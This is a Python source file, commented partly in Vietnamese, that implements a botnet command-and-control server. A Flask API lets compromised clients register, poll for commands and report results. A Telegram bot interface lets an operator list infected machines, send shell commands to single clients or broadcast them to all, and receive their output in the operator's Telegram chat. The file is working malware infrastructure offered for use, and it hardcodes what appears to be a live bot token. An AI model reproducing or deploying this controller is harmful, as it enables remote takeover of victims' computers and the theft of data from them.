#!/usr/bin/env python3
from flask import Flask, request, jsonify
import json
import os
import threading
import time
import hashlib
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from apscheduler.schedulers.background import BackgroundScheduler

# ========== CẤU HÌNH ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8928657652:AAFmDv6nlNcoxqKtB2gmcZ1kyvnjj5rd2A8")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8003369858))
DATA_FILE = "botnet_data.json"
COMMAND_HISTORY = "commands.log"
# ===============================

flask_app = Flask(__name__)

default_data = {
    "clients": {},
    "groups": {},
    "tasks": [],
    "statistics": {"total": 0, "online": 0, "offline": 0}
}

def load_data():
    if not os.path.exists(DATA_FILE):
        save_data(default_data)
        return default_data
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def log_command(cmd, target, result=""):
    with open(COMMAND_HISTORY, "a") as f:
        f.write(f"[{datetime.now()}] TARGET:{target} CMD:{cmd} RESULT:{result[:200]}\n")

# ========== FLASK API ==========
@flask_app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "Botnet Controller running", "clients": len(load_data()["clients"])})

@flask_app.route("/register", methods=["POST"])
def register():
    data = request.json
    client_id = data.get("client_id")
    os_info = data.get("os", "unknown")
    arch = data.get("arch", "unknown")
    
    if not client_id:
        return jsonify({"status": "error"}), 400
    
    bot_data = load_data()
    if client_id not in bot_data["clients"]:
        bot_data["clients"][client_id] = {
            "ip": request.remote_addr,
            "os": os_info,
            "arch": arch,
            "status": "online",
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "group": "default",
            "command": None,
            "logs": [],
            "tasks_completed": 0
        }
        bot_data["statistics"]["total"] += 1
    else:
        bot_data["clients"][client_id]["status"] = "online"
        bot_data["clients"][client_id]["last_seen"] = datetime.now().isoformat()
        bot_data["clients"][client_id]["ip"] = request.remote_addr
    
    save_data(bot_data)
    return jsonify({"status": "ok", "client_id": client_id})

@flask_app.route("/poll", methods=["POST"])
def poll():
    data = request.json
    client_id = data.get("client_id")
    if not client_id:
        return jsonify({"status": "error"}), 400
    
    bot_data = load_data()
    if client_id not in bot_data["clients"]:
        return jsonify({"status": "error"}), 404
    
    bot_data["clients"][client_id]["last_seen"] = datetime.now().isoformat()
    bot_data["clients"][client_id]["status"] = "online"
    
    cmd = bot_data["clients"][client_id].get("command")
    bot_data["clients"][client_id]["command"] = None
    
    if not cmd and bot_data.get("tasks"):
        for task in bot_data["tasks"]:
            if task["status"] == "pending":
                target = task.get("target", "all")
                if target == "all" or target == client_id or client_id in bot_data.get("groups", {}).get(target, []):
                    cmd = task["command"]
                    task["status"] = "sent"
                    task["sent_to"] = task.get("sent_to", []) + [client_id]
                    break
    
    save_data(bot_data)
    return jsonify({"status": "ok", "command": cmd})

@flask_app.route("/report", methods=["POST"])
def report():
    data = request.json
    client_id = data.get("client_id")
    report_type = data.get("type")
    content = data.get("content", "")
    
    bot_data = load_data()
    if client_id in bot_data["clients"]:
        if report_type == "log":
            bot_data["clients"][client_id]["logs"].append(f"[{datetime.now()}] {content[:500]}")
            if len(bot_data["clients"][client_id]["logs"]) > 500:
                bot_data["clients"][client_id]["logs"] = bot_data["clients"][client_id]["logs"][-500:]
            forward_to_telegram(client_id, content)
        elif report_type == "result":
            log_command(content, client_id, content)
            forward_to_telegram(f"📊 Kết quả từ {client_id}", content)
        save_data(bot_data)
    return jsonify({"status": "ok"})

def forward_to_telegram(client_id, content):
    try:
        import requests
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        msg = f"📥 **{client_id}**\n```\n{content[:3000]}\n```"
        requests.post(url, data={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

# ========== TELEGRAM BOT HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Unauthorized")
        return
    
    keyboard = [
        [InlineKeyboardButton("📋 List Clients", callback_data="list")],
        [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
        [InlineKeyboardButton("🎯 Create Task", callback_data="task")],
        [InlineKeyboardButton("⚡ Broadcast", callback_data="broadcast")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🤖 **BotNet Controller v2.0**\nQuản lý botnet qua Telegram", 
                                    parse_mode="Markdown", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id != ADMIN_ID:
        await query.edit_message_text("🚫 Unauthorized")
        return
    
    data = query.data
    bot_data = load_data()
    
    if data == "list":
        if not bot_data["clients"]:
            await query.edit_message_text("❌ No clients")
            return
        
        text = "📋 **Botnet Clients:**\n\n"
        for cid, info in list(bot_data["clients"].items())[:10]:
            status = "🟢" if info["status"] == "online" else "🔴"
            text += f"{status} `{cid[:16]}...` | {info['ip']} | {info['os']}\n"
        
        text += f"\n📊 Tổng: {bot_data['statistics']['total']} | Online: {bot_data['statistics']['online']}"
        
        keyboard = []
        for cid in list(bot_data["clients"].keys())[:5]:
            keyboard.append([InlineKeyboardButton(f"⚙️ {cid[:10]}...", callback_data=f"ctrl_{cid}")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data.startswith("ctrl_"):
        cid = data[5:]
        context.user_data["selected_client"] = cid
        keyboard = [
            [InlineKeyboardButton("⏹ Stop", callback_data=f"stop_{cid}")],
            [InlineKeyboardButton("🔄 Restart", callback_data=f"restart_{cid}")],
            [InlineKeyboardButton("📄 Logs", callback_data=f"logs_{cid}")],
            [InlineKeyboardButton("⌨️ Shell", callback_data=f"shell_{cid}")],
            [InlineKeyboardButton("🔙 Back", callback_data="list")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        info = bot_data["clients"].get(cid, {})
        text = f"⚙️ **Điều khiển {cid[:16]}**\nIP: {info.get('ip','N/A')}\nOS: {info.get('os','N/A')}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data.startswith("stop_"):
        cid = data[5:]
        if cid in bot_data["clients"]:
            bot_data["clients"][cid]["command"] = "STOP"
            bot_data["clients"][cid]["status"] = "offline"
            save_data(bot_data)
            await query.edit_message_text(f"✅ STOP sent to {cid[:16]}")
    
    elif data.startswith("restart_"):
        cid = data[8:]
        if cid in bot_data["clients"]:
            bot_data["clients"][cid]["command"] = "RESTART"
            save_data(bot_data)
            await query.edit_message_text(f"✅ RESTART sent to {cid[:16]}")
    
    elif data.startswith("logs_"):
        cid = data[5:]
        if cid in bot_data["clients"] and bot_data["clients"][cid]["logs"]:
            logs = "\n".join(bot_data["clients"][cid]["logs"][-20:])
            await query.edit_message_text(f"📄 **Logs {cid[:16]}:**\n```\n{logs[:3500]}\n```", parse_mode="Markdown")
        else:
            await query.edit_message_text(f"📭 No logs for {cid[:16]}")
    
    elif data.startswith("shell_"):
        cid = data[6:]
        context.user_data["shell_client"] = cid
        await query.edit_message_text(f"⌨️ Nhập lệnh shell cho {cid[:16]}:\n`/cmd <lệnh>`", parse_mode="Markdown")
    
    elif data == "stats":
        clients = bot_data["clients"]
        online = sum(1 for c in clients.values() if c["status"] == "online")
        text = f"""📊 **Botnet Statistics:**
├─ Tổng clients: {len(clients)}
├─ Online: {online}
├─ Offline: {len(clients)-online}
└─ Tasks pending: {len([t for t in bot_data.get('tasks',[]) if t['status']=='pending'])}"""
        await query.edit_message_text(text, parse_mode="Markdown")
    
    elif data == "task":
        await query.edit_message_text("⌨️ Tạo task cho ALL clients:\n`/task <lệnh>`", parse_mode="Markdown")
    
    elif data == "broadcast":
        await query.edit_message_text("📢 Gửi lệnh broadcast:\n`/broadcast <lệnh>`", parse_mode="Markdown")
    
    elif data == "refresh":
        await query.edit_message_text("🔄 Refreshed!")

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Unauthorized")
        return
    if not context.args:
        await update.message.reply_text("⚠️ /cmd <lệnh>")
        return
    
    cid = context.user_data.get("shell_client")
    if not cid:
        await update.message.reply_text("⚠️ Chọn client bằng nút Shell trước")
        return
    
    cmd = " ".join(context.args)
    bot_data = load_data()
    if cid in bot_data["clients"]:
        bot_data["clients"][cid]["command"] = f"shell:{cmd}"
        save_data(bot_data)
        await update.message.reply_text(f"✅ Sent to {cid[:16]}: `{cmd}`", parse_mode="Markdown")

async def task_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Unauthorized")
        return
    if not context.args:
        await update.message.reply_text("⚠️ /task <lệnh>")
        return
    
    cmd = " ".join(context.args)
    bot_data = load_data()
    task = {
        "id": hashlib.md5(f"{time.time()}{cmd}".encode()).hexdigest()[:8],
        "command": f"shell:{cmd}",
        "target": "all",
        "status": "pending",
        "created": datetime.now().isoformat(),
        "sent_to": []
    }
    bot_data["tasks"].append(task)
    save_data(bot_data)
    await update.message.reply_text(f"✅ Task created: `{cmd}`\nTarget: all clients", parse_mode="Markdown")

async def broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Unauthorized")
        return
    if not context.args:
        await update.message.reply_text("⚠️ /broadcast <lệnh>")
        return
    
    cmd = " ".join(context.args)
    bot_data = load_data()
    count = 0
    for cid in bot_data["clients"]:
        if bot_data["clients"][cid]["status"] == "online":
            bot_data["clients"][cid]["command"] = f"shell:{cmd}"
            count += 1
    save_data(bot_data)
    await update.message.reply_text(f"📢 Broadcast `{cmd}` to {count} clients", parse_mode="Markdown")

# ========== MAIN ==========
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    # Chạy Flask trong thread riêng
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Scheduler
    scheduler = BackgroundScheduler()
    scheduler.start()
    
    # Telegram Bot
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmd", cmd_handler))
    app.add_handler(CommandHandler("task", task_handler))
    app.add_handler(CommandHandler("broadcast", broadcast_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 BotNet Controller started...")
    
    # Dùng run_polling đồng bộ (phiên bản 13.7)
    app.run_polling()
